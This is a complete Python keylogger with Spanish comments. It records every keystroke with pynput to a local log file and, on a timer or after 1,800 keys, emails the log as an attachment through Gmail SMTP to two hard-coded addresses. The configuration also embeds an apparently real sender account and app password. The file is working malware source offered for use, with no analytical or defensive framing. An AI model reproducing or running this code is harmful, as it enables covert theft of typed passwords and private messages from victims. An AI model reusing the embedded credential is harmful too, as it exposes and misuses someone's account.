from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from smtplib import SMTP
import sys
import time
import threading

# CONFIGURACIÓN (MODIFICA ESTOS VALORES)
CONFIG = {
    'email_from': 'fokolotorolo@gmail.com',
    'password': 'uczb gctp ksya xzul',  # Usar contraseña de aplicación
    'smtp_server': 'smtp.gmail.com:587',
    'destinatarios': [
        'felipe.morgado2000@gmail.com',
        'feli.morgado@duocuc.cl'
    ],
    'intervalo_envio': 300,  # Segundos entre envíos (5 minutos)
    'max_teclas': 1800  # Máximo de teclas antes de enviar automáticamente
}

class KeyloggerMasivo:
    def __init__(self):
        self.teclas_capturadas = 0
        self.archivo_log = "log.txt"
        self.enviando = False
        
    def enviar_correo_masivo(self):
        """Envía el log a todos los destinatarios"""
        if self.enviando:
            return
            
        self.enviando = True
        try:
            # Leer el contenido actual del log
            try:
                with open(self.archivo_log, 'rb') as f:
                    contenido = f.read()
                if len(contenido) == 0:
                    return
            except FileNotFoundError:
                return

            # Enviar a cada destinatario
            for destinatario in CONFIG['destinatarios']:
                try:
                    self._enviar_correo_individual(destinatario, contenido)
                    print(f"[+] Log enviado a: {destinatario}")
                    time.sleep(2)  # Pausa entre envíos para evitar límites
                except Exception as e:
                    print(f"[-] Error enviando a {destinatario}: {str(e)}")
                    
            # Reiniciar contador después de enviar
            self.teclas_capturadas = 0
            
        except Exception as e:
            print(f"[-] Error en envío masivo: {str(e)}")
        finally:
            self.enviando = False

    def _enviar_correo_individual(self, destinatario, contenido):
        """Envía correo a un destinatario específico"""
        mensaje = MIMEMultipart("plain")
        mensaje["From"] = CONFIG['email_from']
        mensaje["To"] = destinatario
        mensaje["Subject"] = f"Keylogger Report - {time.strftime('%Y-%m-%d %H:%M:%S')}"

        # Crear adjunto
        adjunto = MIMEBase("application", "octet-stream")
        adjunto.set_payload(contenido)
        encoders.encode_base64(adjunto)
        adjunto.add_header(
            "Content-Disposition", 
            f'attachment; filename="keylog_{time.strftime("%Y%m%d_%H%M%S")}.txt"'
        )
        mensaje.attach(adjunto)

        # Enviar correo
        server = SMTP(CONFIG['smtp_server'])
        server.starttls()
        server.login(CONFIG['email_from'], CONFIG['password'])
        server.sendmail(CONFIG['email_from'], destinatario, mensaje.as_string())
        server.quit()

    def enviar_periodicamente(self):
        """Envía correos periódicamente en un hilo separado"""
        while True:
            time.sleep(CONFIG['intervalo_envio'])
            if self.teclas_capturadas > 0:
                print(f"[+] Envío periódico iniciado...")
                self.enviar_correo_masivo()

    def keyboard_listener(self, key):
        """Maneja la captura de teclas"""
        letra = str(key)
        letra = letra.replace("'", "")

        # Mapeo de teclas especiales
        special_keys = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.tab': '    ',
            'Key.backspace': '[BACKSPACE]',
            'Key.delete': '[DEL]',
            'Key.esc': '[ESC]',
            'Key.shift': '',
            'Key.shift_r': '',
            'Key.shift_l': '',
            'Key.ctrl_l': '[CTRL]',
            'Key.ctrl_r': '[CTRL]',
            'Key.alt_l': '[ALT]',
            'Key.alt_r': '[ALT]',
            'Key.caps_lock': '[CAPS]',
            'Key.up': '[UP]',
            'Key.down': '[DOWN]',
            'Key.left': '[LEFT]',
            'Key.right': '[RIGHT]',
            'Key.f1': '[F1]',
            'Key.f2': '[F2]',
            'Key.f3': '[F3]',
            'Key.f4': '[F4]',
            'Key.f5': '[F5]',
            'Key.f6': '[F6]',
            'Key.f7': '[F7]',
            'Key.f8': '[F8]',
            'Key.f9': '[F9]',
            'Key.f10': '[F10]',
            'Key.f11': '[F11]',
            'Key.f12': '[F12]',
        }

        letra = special_keys.get(letra, letra)

        # Escribir en el archivo
        with open(self.archivo_log, "a", encoding='utf-8') as f:
            f.write(letra)

        self.teclas_capturadas += 1

        # Enviar automáticamente después de cierto número de teclas
        if self.teclas_capturadas >= CONFIG['max_teclas']:
            print(f"[+] Límite de teclas alcanzado, enviando...")
            self.enviar_correo_masivo()

        # Atajos de teclado
        if key == getattr(key, 'f12', None):
            print("[+] Cerrando keylogger...")
            sys.exit()
        elif key == getattr(key, 'f11', None):
            print("[+] Envío manual iniciado...")
            threading.Thread(target=self.enviar_correo_masivo).start()

    def main(self):
        """Función principal"""
        print("[+] Keylogger masivo iniciado")
        print(f"[+] Enviando a {len(CONFIG['destinatarios'])} destinatarios")
        print(f"[+] Intervalo de envío: {CONFIG['intervalo_envio']} segundos")
        print("[+] F12 para salir, F11 para envío manual")

        # Iniciar hilo para envíos periódicos
        thread_envios = threading.Thread(target=self.enviar_periodicamente)
        thread_envios.daemon = True
        thread_envios.start()

        # Iniciar listener del teclado
        with Listener(on_press=self.keyboard_listener) as listener:
            listener.join()

if __name__ == '__main__':
    keylogger = KeyloggerMasivo()
    try:
        keylogger.main()
    except KeyboardInterrupt:
        print("\n[+] Keylogger detenido por el usuario")
        sys.exit()